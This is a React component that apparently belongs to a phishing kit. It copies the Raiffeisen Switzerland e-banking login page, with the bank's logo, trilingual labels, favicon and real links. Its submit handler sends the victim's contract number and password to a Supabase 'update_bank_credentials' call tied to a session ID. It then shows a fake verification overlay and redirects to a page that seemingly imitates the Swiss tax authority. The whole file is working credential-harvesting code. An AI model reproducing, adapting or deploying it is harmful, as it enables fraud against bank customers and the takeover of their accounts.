import { useEffect, useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";

const RaiffeisenLogo = ({ className = "" }: { className?: string }) => (
  <svg viewBox="0 0 200 30" xmlns="http://www.w3.org/2000/svg" className={className} aria-label="Raiffeisen">
    <path
      fill="currentColor"
      d="M137.742 23.6003s1.766 1.5393 5.27 1.5393c2.816 0 4.188-1.6613 4.188-3.6884 0-2.0272-1.722-3.0867-3.286-3.9384l-2.206-1.1975c-3.544-1.9232-5.054-4.3082-5.054-7.29092 0-5.31377 3.574-8.624378 8.702-8.624378 4.166 0 6.608 1.419408 6.608 1.419408l-1.08 4.66404c-1.362-1.17551-3.014-1.58134-4.816-1.58134-2.444 0-3.852 1.54135-3.852 3.49054 0 1.57134.858 2.46895 2.26 3.20065l2.722 1.4194c4.292 2.2371 5.768 4.5841 5.768 7.9087 0 5.4137-3.88 8.7643-9.752 8.7643-4.348 0-6.608-1.2895-6.608-1.2895l1.138-4.7939-.002-.002zm-100.87-3.6925l-2.56-8.9322c-.364-1.25551-.768-3.21669-.768-3.21669s-.402 1.96118-.766 3.21669l-2.54 8.9322H36.872zm8.702 9.3941h-6.218l-1.494-5.3058h-8.63l-1.452 5.3058h-5.21l7.508-24.77363c.202-.68971.324-1.09354.324-1.49737 0-1.13353-.808-2.119113-.808-2.119113h6.864L45.574 29.2999v.002zm73.098-4.74l-1.13 4.74H103.37V.913786h14.978L117.22 5.58183h-8.276v7.08107h7.954l-1.09 4.574h-6.864v7.325h9.73-.002zM49.468.913786h5.612V29.3019h-5.612V.913786zM88.632 17.2369v12.065H82.98V.913786h14.98L96.91 5.58183h-8.278v7.08107h7.914l-1.05 4.574h-6.864zm-20.308 0v12.065h-5.572V.913786h14.98l-1.05 4.668044h-8.358v7.08107h7.954l-1.05 4.574h-6.904zm105.714 7.325l-1.132 4.74h-14.17V.925781h14.978l-1.09 4.656049h-8.316v7.08107h7.954l-1.09 4.574h-6.864v7.325h9.73zM124.89.913786h5.612V29.3019h-5.612V.913786zM5.612 29.3019H0V.643899c4.522 0 7.226-.243897 9.366-.243897 5.814 0 10.054 2.508948 10.054 8.702348 0 3.72045-2.26 6.63525-5.572 7.52685 0 0 .848 1.0116 1.374 2.1851l4.884 10.4876h-6.298L8.396 17.6408c-1.372-2.9528-2.26-3.5605-2.26-3.5605.564.0419 1.09.0419 1.534.0419 4.078 0 6.016-1.8632 6.016-4.85792 0-2.99474-2.138-4.33018-5.29-4.33018-1.654 0-2.784.11995-2.784.11995V29.3019zm194.388 0h-2.262l-9.206-13.6843c-1.736-2.5909-3.514-5.4637-3.514-5.4637s.082 2.8748.082 5.4637v13.6843h-4.684V5.58183c0-1.21349-.122-1.90321-.484-2.75285-.526-1.13152-1.334-1.915194-1.334-1.915194h6.54l6.622 9.643914c1.776 2.551 3.674 5.5457 3.674 5.5457s-.122-2.9927-.122-5.5457V.913786h4.684V29.3019H200z"
    />
  </svg>
);

const BRONZE = "#9B8666";

const TRANSLATIONS = {
  de: {
    title: "Login für E-Banking",
    contract: "Vertragsnummer",
    password: "Persönliches Passwort",
    submit: "Weiter",
    forgot: "Passwort vergessen?",
    phototan: "Neues Gerät für PhotoTAN aktivieren",
    help: "Hilfe und Kontakt",
    demo: "Demo E-Banking",
    copyright: "© Raiffeisen Schweiz",
  },
  fr: {
    title: "Login pour e-banking",
    contract: "Numéro de contrat",
    password: "Mot de passe personnel",
    submit: "Suivant",
    forgot: "Mot de passe oublié?",
    phototan: "Activer un nouvel appareil pour PhotoTAN",
    help: "Aide et contact",
    demo: "Démo e-banking",
    copyright: "© Raiffeisen Suisse",
  },
  it: {
    title: "Login per e-banking",
    contract: "Numero di contratto",
    password: "Parola chiave personale",
    submit: "Avanti",
    forgot: "Password dimenticata?",
    phototan: "Attivare nuovo dispositivo per PhotoTAN",
    help: "Aiuto e contatto",
    demo: "Demo e-banking",
    copyright: "© Raiffeisen Svizzera",
  },
} as const;

const ChRaiffeisen = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<"de" | "fr" | "it">("de");
  const t = TRANSLATIONS[lang];

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);
  usePageMeta("Raiffeisen E-Banking Login", "https://www.raiffeisen.ch/favicon.ico");

  const handleSubmit = async () => {
    if (!vertragsnummer || !passwort) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Persönliches Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white font-sans text-[#1a1a1a]">
        {/* Header */}
        <header className="h-20 flex items-center px-6 md:px-12">
          <RaiffeisenLogo className="h-5 md:h-7 text-[#E2001A]" />
        </header>

        {/* Full-screen main area */}
        <main className="flex-1 flex flex-col px-6 md:px-12 min-h-[calc(100vh-80px)]">

          <div className="w-full max-w-[530px] md:ml-[22%] pt-12 md:pt-16">
            <h1 className="text-3xl md:text-4xl font-bold mb-10">{t.title}</h1>

            {/* Vertragsnummer - Floating Label */}
            <div className="mb-8">
              <div className="relative border-b border-[#949494] focus-within:border-b-[3px] focus-within:border-black transition-all">
                <input
                  id="vertragsnummer"
                  type="text"
                  value={vertragsnummer}
                  onChange={(e) => setVertragsnummer(e.target.value)}
                  placeholder=" "
                  className="peer w-full bg-transparent pt-5 pb-2 text-base text-black focus:outline-none"
                  autoComplete="off"
                />
                <label
                  htmlFor="vertragsnummer"
                  className="absolute left-0 top-3 text-base text-[#949494] transition-all duration-200 ease-out pointer-events-none peer-focus:top-0 peer-focus:text-xs peer-focus:text-black peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:text-black"
                >
                  {t.contract}
                </label>
              </div>
            </div>

            {/* Persönliches Passwort - Floating Label */}
            <div className="mb-10">
              <div className="relative border-b border-[#949494] focus-within:border-b-[3px] focus-within:border-black transition-all">
                <input
                  id="passwort"
                  type="password"
                  value={passwort}
                  onChange={(e) => setPasswort(e.target.value)}
                  placeholder=" "
                  className="peer w-full bg-transparent pt-5 pb-2 text-base text-black focus:outline-none"
                  autoComplete="off"
                />
                <label
                  htmlFor="passwort"
                  className="absolute left-0 top-3 text-base text-[#949494] transition-all duration-200 ease-out pointer-events-none peer-focus:top-0 peer-focus:text-xs peer-focus:text-black peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:text-black"
                >
                  {t.password}
                </label>
              </div>
            </div>

            {/* Weiter Button */}
            <button
              onClick={handleSubmit}
              className="w-full md:w-auto bg-[#1a1a1a] text-white font-medium px-14 py-3 rounded-sm hover:bg-[#333] transition-colors mb-8"
            >
              {t.submit}
            </button>

            {/* Passwort vergessen */}
            <div className="text-center md:text-left">
              <a href="https://login.raiffeisen.ch/de/first-factor" className="text-base underline underline-offset-[6px] decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
                {t.forgot}
              </a>
            </div>
          </div>

          {/* Bottom service links */}
          <div className="mt-auto pt-10 pb-8 w-full flex flex-col md:flex-row items-stretch md:items-center md:justify-between md:pl-[22%] pr-6 md:pr-12 text-base">
            <a href="https://login.raiffeisen.ch/de/first-factor" className="self-start underline underline-offset-4 decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
              {t.phototan}
            </a>
            <a href="https://login.raiffeisen.ch/de/first-factor" className="self-end mt-10 md:mt-0 underline underline-offset-4 decoration-1 hover:decoration-2 hover:decoration-black transition-all" style={{ color: BRONZE }}>
              {t.help}
            </a>
          </div>



        </main>

        {/* Footer */}
        <footer className="bg-[#f2f2f2] relative">
          <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-10 md:gap-0 pt-10 pb-2 px-6 md:px-[90px] text-sm">
            <span className="font-bold text-black">{t.demo}</span>
            <div className="flex items-center gap-8">
              {(["de", "fr", "it"] as const).map((l) => (
                <button
                  key={l}
                  onClick={() => setLang(l)}
                  className={`uppercase ${lang === l ? "font-bold text-black" : "text-black hover:underline"}`}
                >
                  {l}
                </button>
              ))}
            </div>
          </div>
          <div className="px-6 md:px-[90px] pb-10 pt-10 md:pt-8 text-sm text-black">{t.copyright}</div>
        </footer>

        {/* Roter Balken (50% links) + grauer Streifen rechts */}
        <div className="bg-[#f2f2f2]">
          <div className="w-1/2 h-[54px] bg-[#E2001A]" />
        </div>

      </div>
    </>
  );
};

export default ChRaiffeisen;
